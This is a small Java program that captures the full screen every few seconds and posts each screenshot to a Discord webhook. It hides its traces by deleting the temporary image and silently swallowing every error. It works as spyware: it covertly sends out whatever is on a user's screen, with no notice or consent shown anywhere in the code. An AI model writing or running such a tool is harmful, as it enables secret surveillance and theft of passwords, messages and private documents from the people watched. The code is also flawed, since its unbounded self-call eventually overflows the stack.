package apple26j;

import net.ranktw.DiscordWebHooks.DiscordWebhook;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;

public class Main
{
    /*
     * The WebHook
     */
    public static final String WEBHOOK = "";

    public static final double timeInSecondsBeforeSendingAnotherImage = 5;

    public static void main(String[] arguments)
    {
        call_This_Method_Only_Once_After_That_It_Will_Automatically_Call_Itself();
    }

    public static void call_This_Method_Only_Once_After_That_It_Will_Automatically_Call_Itself()
    {
        long seconds = (long) (timeInSecondsBeforeSendingAnotherImage * 1000) - 1500;

        if (seconds < 0)
        {
            seconds = 0;
        }

        try
        {
            DiscordWebhook discordWebhook = new DiscordWebhook(WEBHOOK);
            Robot robot = new Robot();
            Rectangle rectangle = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage bufferedImage = robot.createScreenCapture(rectangle);
            File image = new File(System.getProperty("java.io.tmpdir"), "image.png");

            if (image.exists())
            {
                image.delete();
            }

            image.createNewFile();
            ImageIO.write(bufferedImage, "png", image);
            discordWebhook.sendMessage(image);
            image.delete();
        }

        catch (Exception e)
        {
            ;
        }

        long time = System.nanoTime() / 1000000;

        while (((System.nanoTime() / 1000000) - seconds) < time)
        {
            ;
        }

        call_This_Method_Only_Once_After_That_It_Will_Automatically_Call_Itself();
    }
}
